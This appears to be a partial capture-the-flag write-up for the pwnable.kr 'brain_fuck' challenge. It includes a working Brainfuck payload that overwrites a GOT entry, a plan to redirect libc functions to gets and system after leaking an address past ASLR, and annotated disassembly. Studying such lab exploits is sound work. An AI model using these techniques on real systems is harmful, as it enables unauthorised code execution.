### brain_fuck
It is a programming language https://en.wikipedia.org/wiki/Brainfuck.
There are 2 files to download: `bf` and `bf_libc.so`
When running `bf_libc.so` I get:
```
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu3) stable release version 2.23, by Roland McGrath et al.
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 5.3.1 20160413.
Available extensions:
	crypt add-on version 2.1 by Michael Glad and others
	GNU Libidn by Simon Josefsson
	Native POSIX Threads Library by Ulrich Drepper et al
	BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```
So I downloaded [libc6-i386_2.23-0ubuntu3_amd64.deb](http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6-i386_2.23-0ubuntu3_amd64.deb) and then:
```
$dpkg -x libc6-i386_2.23-0ubuntu3_amd64.deb /tmp/out
$ md5sum /tmp/out/lib32/libc-2.23.so 
6141f30bb3599533e27d352e0672343d  /tmp/out/lib32/libc-2.23.so
$ md5sum bf_libc.so 
6141f30bb3599533e27d352e0672343d  bf_libc.so
```
So, there is nothing special added to `bf_libc.so` it is just `libc.so` version 2.23 for i386.

-------------------------------
We have a constant address p = 0x804a080 which is initiated with the value 
0x0804a0a0. The idea is to overwrite the values in the got.plt.
Example: Let change the address in the `got.plt` that points to `getchar` to point to `main`.
 
`0x0804a00c` is the `got.plt` address of the `getchar`, it is initialized to `0x08048446`. So
it is a 4 byte address located in the area `0x0804a00c-0x0804a00f`

`0x08048671` is the address of main


1) our pointer `p` should change to point to  `0x0804a00f` so decrements 145 from the current value:  to reach `0x0804a00f` from `0x0804a0a0`. This is done by `145*'<'`

2) We need to change the value from `0x08048446` to `0x08048671`, the first 2 bytes are already 0804 so no need to change them, so add two more `<<`
//then we should change 84 to 86 so add `++`
//decremnt th pointer to the next byte to change: `'<'`
//then we change 0x46 to 0x71:  0x71-0x46 = 0x2b = 43 so add  `43* '+'`
//then call getchar: by adding `','`
```
dafna@vdoo:~/kamomil/pwnable/brain_fuck$ python3 -c "print(145*'<'+'<<++<'+43*'+'+',')" | nc pwnable.kr 9001
welcome to brainfuck testing system!!
type some brainfuck instructions except [ ]
welcome to brainfuck testing system!!
type some brainfuck instructions except [ ]
```
So this is how it works, you see the strings are printed twice since `main` was called twice.

our set of plt functions are:

```
objdump -d bf | grep -oE "\w+@plt" | sort | uniq
fgets@plt
getchar@plt
__gmon_start__@plt
__libc_start_main@plt
memset@plt
putchar@plt
puts@plt
setvbuf@plt
__stack_chk_fail@plt
strlen@plt
```
during main we have the following sequence of calls:
```
call   0x8048470 <puts@plt>
call   0x8048470 <puts@plt>
call   0x80484c0 <memset@plt>
call   0x8048450 <fgets@plt>
while(string len)
call   0x80485dc <do_brainfuck>
call   0x8048490 <strlen@plt>
endwhile
```

#### `putchar` to `_start`:
_start address is 0x080484e0
`0x804a030` is the `got.plt` address of the `putchar`, initialized to `0x080484d6`

####  `memset` to  `gets`
`0x804a02c` is the `got.plt` address of `memset`
Since `gets` is not in our plt functions we have to find the way to find it.
the ASLR mechanism randomize the starting offset of the libc (call it `s`) therefore 
in order to find the offset in libc we will choose a function `X` in libc.
We will find the offset `xoff` of `X` from that starting point `a` then we will use brainfuck to leak it's absolute address `xabs`. Then we have `xabs = a + xoff --> a = xabs - xoff` .
Then after we have `a` we can find the absolute address of any libc function `Y` by `yabs = a + yoff`.
 
 ```
# 

 ```
 
 
gets address: 386928

#### `fgets` to `system`.

system address 239904

//set the value in the address
//(*p)++ //' case '>':

   0x080485fe <+34>:	mov    eax,ds:0x804a080
   0x08048603 <+39>:	add    eax,0x1
   0x08048606 <+42>:	mov    ds:0x804a080,eax
   0x0804860b <+47>:	jmp    0x804866b <do_brainfuck+143>
   
  //(*p)-- //case '<':
   0x0804860d <+49>:	mov    eax,ds:0x804a080
   0x08048612 <+54>:	sub    eax,0x1
   0x08048615 <+57>:	mov    ds:0x804a080,eax
   0x0804861a <+62>:	jmp    0x804866b <do_brainfuck+143>
   
   //set the value pointed by the value in the address
   //(**p)++ //case '+':
   0x0804861c <+64>:	mov    eax,ds:0x804a080
   0x08048621 <+69>:	movzx  edx,BYTE PTR [eax]
   0x08048624 <+72>:	add    edx,0x1
   0x08048627 <+75>:	mov    BYTE PTR [eax],dl
   0x08048629 <+77>:	jmp    0x804866b <do_brainfuck+143>
   
   //(**p)-- //case '-':
   0x0804862b <+79>:	mov    eax,ds:0x804a080
   0x08048630 <+84>:	movzx  edx,BYTE PTR [eax]
   0x08048633 <+87>:	sub    edx,0x1
   0x08048636 <+90>:	mov    BYTE PTR [eax],dl
   0x08048638 <+92>:	jmp    0x804866b <do_brainfuck+143>
   
   //show the last byte in (**p) //case '.':
   0x0804863a <+94>:	mov    eax,ds:0x804a080
   0x0804863f <+99>:	movzx  eax,BYTE PTR [eax]
   0x08048642 <+102>:	movsx  eax,al
   0x08048645 <+105>:	mov    DWORD PTR [esp],eax
   0x08048648 <+108>:	call   0x80484d0 <putchar@plt>
   0x0804864d <+113>:	jmp    0x804866b <do_brainfuck+143>
   
   //set the last byte in (**p) from user input //case ',':
   0x0804864f <+115>:	mov    ebx,DWORD PTR ds:0x804a080
   0x08048655 <+121>:	call   0x8048440 <getchar@plt>
   0x0804865a <+126>:	mov    BYTE PTR [ebx],al
   0x0804865c <+128>:	jmp    0x804866b <do_brainfuck+143>
   
   //print that '[' is not allowed // case '[':
   0x0804865e <+130>:	mov    DWORD PTR [esp],0x8048830
   0x08048665 <+137>:	call   0x8048470 <puts@plt>


